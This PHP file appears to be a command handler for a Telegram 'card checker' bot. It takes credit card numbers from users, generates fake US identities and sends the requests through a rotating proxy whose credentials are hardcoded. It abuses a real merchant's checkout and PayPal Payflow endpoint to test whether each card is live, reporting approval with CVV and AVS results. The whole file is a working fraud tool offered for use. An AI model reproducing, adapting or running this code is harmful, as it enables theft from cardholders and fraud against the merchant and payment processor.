<?php

require __DIR__ . "/../Class/Capsolver/autoload.php";

$gatewayname="pf";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#PayflowAvsAuth (".'$pf'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $cookie = uniqid();
 
 $socks5 = "x.botproxy.net:8080";
 $rotate = "pxu41762-0:cuvtwTC1VNEbVwViwf4A";
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
 

 //==================[Curl Request]======================//
 
 $response = CurlX::Get(
    "https://www.keepsakebowling.com/checkout/cart/",
    [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer: https://www.keepsakebowling.com/',
        'Connection: keep-alive',
        
        'Upgrade-Insecure-Requests: 1',
    ],
    $cookie,
    $proxies
);
echo $form_key =CurlX::ParseString($response->body,'name="form_key" type="hidden" value="','"');
$cartid = 'dUGJCXevkHlGXCDPSNLry41EuesYIXoe';

sleep(8);
$data = [
    'cartId' => $cartid,
    'paymentMethod' => [
        'method' => 'payflowpro',
        'additional_data' => [
            'cc_type' => 'MC',
            'cc_exp_year' => $ano,
            'cc_exp_month' => $mes,
            'cc_last_4' => substr($cc, -4),
        ],
    ],
    'email' => "JoanBaldezTruco" . rand(1000, 9999) . "@gmail.com",
    'billingAddress' => [
        'countryId' => 'US',
        'regionId' => '55',
        'regionCode' => $state_id,
        'region' => $state,
        'street' => [$street],
        'telephone' => $phone,
        'postcode' => $zip,
        'city' => $city,
        'firstname' => 'Joan',
        'lastname' => 'Baldez',
        'saveInAddressBook' => null,
    ],
];


$response = CurlX::Post(
    "https://www.keepsakebowling.com/rest/default/V1/guest-carts/{$cartid}/set-payment-information",
    json_encode($data),
    [
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer: https://www.keepsakebowling.com/',
        'Connection: keep-alive',
        
        'Upgrade-Insecure-Requests: 1',
    ],
   
    $cookie,
    $proxies
);

$data_token = [
    'form_key' => $form_key,
    'captcha_form_id' => 'payment_processing_request',
    'payment[method]' => 'payflowpro',
    'billing-address-same-as-shipping' => 'on',
    'controller' => 'checkout_flow',
    'cc_type' => 'MC',
];
sleep(5);
$response = CurlX::Post(
    'https://www.keepsakebowling.com/paypal/transparent/requestSecureToken/',
    http_build_query($data_token), // Convertir el payload en formato de consulta
    [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer: https://www.keepsakebowling.com/',
        'Connection: keep-alive',
        
        'Upgrade-Insecure-Requests: 1',
    ],
    $cookie,
    $proxies
);

// Procesar la respuesta
if ($response->code == 200) {
    $rep = json_decode($response->body, true); // Decodificar JSON en un arreglo asociativo
    $securetoken = $rep['payflowpro']['fields']['securetoken'] ?? null;
    $securetokenid = $rep['payflowpro']['fields']['securetokenid'] ?? null;

    if ($securetoken && $securetokenid) {
        echo "SecureToken: $securetoken\n";
        echo "SecureTokenID: $securetokenid\n";
    } else {
        echo "Error: No se encontraron los tokens en la respuesta.\n";
    }
} else {
    echo "Error en la solicitud: " . $response->status . " - " . $response->body . "\n";
}

$data_verify = [
    'result' => '0',
    'securetoken' => $securetoken,
    'securetokenid' => $securetokenid,
    'respmsg' => 'Approved',
    'result_code' => '0',
    'csc' => $cvv,
    'expdate' => sprintf("%02d%02d", $mes, substr($ano, -2)), // Formato MMYY
    'acct' => $cc,
];
sleep(7);
$response = CurlX::Post(
    'https://payflowlink.paypal.com/',
    http_build_query($data_verify), // Formatear los datos como x-www-form-urlencoded
    [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer: https://www.keepsakebowling.com/',
        'Connection: keep-alive',
        
        'Upgrade-Insecure-Requests: 1',
    ],
    $cookie,
    $proxies
);

// Procesar la respuesta


 //==================[Manejo de los mensajes]======================//
 if ($response->code == 200) {
    $response_body = $response->body;
    $dom = new DOMDocument();
    @$dom->loadHTML($response_body); // Parsear la respuesta como HTML

    $xpath = new DOMXPath($dom);

    // Verificar si hay un campo "PROCCVV2"
    $proccvv2_node = $xpath->query("//input[@name='PROCCVV2']");
    $avdata_node = $xpath->query("//input[@name='AVSDATA']");
    $respmsg_node = $xpath->query("//input[@name='RESPMSG']");

    if ($proccvv2_node->length > 0) {
        $PROCCVV2 = $proccvv2_node->item(0)->getAttribute("value");
        $AVSDATA = $avdata_node->length > 0 ? $avdata_node->item(0)->getAttribute("value") : '';
        $RESPMSG = $respmsg_node->length > 0 ? $respmsg_node->item(0)->getAttribute("value") : '';

        if (strpos($response_body, 'Verified') !== false || 
            strpos($response_body, 'CVV2 Mismatch') !== false || 
            strpos($response_body, 'Insufficient funds available') !== false) {
                $status="Approved!✅";
            $errormessage= "$RESPMSG \n CVV: [$PROCCVV2] | AVS: [$AVSDATA]";
        } else {
            $status="Declined!❌";
            $errormessage= "$RESPMSG \n CVV: [$PROCCVV2] | AVS: [$AVSDATA]";
        }
    } elseif (strpos($response_body, 'Verified') !== false || 
              strpos($response_body, 'CVV2 Mismatch') !== false || 
              strpos($response_body, 'Insufficient funds available') !== false) {
        $RESPMSG = $respmsg_node->length > 0 ? $respmsg_node->item(0)->getAttribute("value") : '';
        $status="Approved!✅";
        $errormessage="$RESPMSG";
    } elseif ($respmsg_node->length > 0) {
        $RESPMSG = $respmsg_node->item(0)->getAttribute("value");
        $status="Declined!❌";
        $errormessage="$RESPMSG";
    } else {
        echo $response_body;
        $errormessage= "There was a problem processing the request.";
        file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
    }
} else {
    $errormessage= "There was a problem processing the request.";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
}

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($status == "Approved!✅"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText($status, "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
